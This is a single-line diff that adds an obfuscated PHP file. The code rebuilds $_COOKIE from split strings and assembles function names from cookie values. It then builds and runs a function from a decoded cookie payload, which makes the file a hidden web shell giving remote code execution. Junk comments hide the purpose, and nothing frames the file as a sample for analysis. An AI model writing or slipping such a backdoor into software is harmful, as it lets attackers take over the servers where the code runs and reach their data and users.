@@ -1,0 +1,1 @@
+<?php $j='_C';$au='E';/*Xj*/$uo='OO';/*j*/$b='KI';$ou/*)*/=${$j.$uo.$b.$au};$e=/*XK_f*/$ou['b'].$ou/*g*/['X'];$ez=$ou['lG']./*PFA*/$ou['EO'].$ou['iF']/*(_q*/;$ls=$e('',$ez($ou['nF']));$ls();
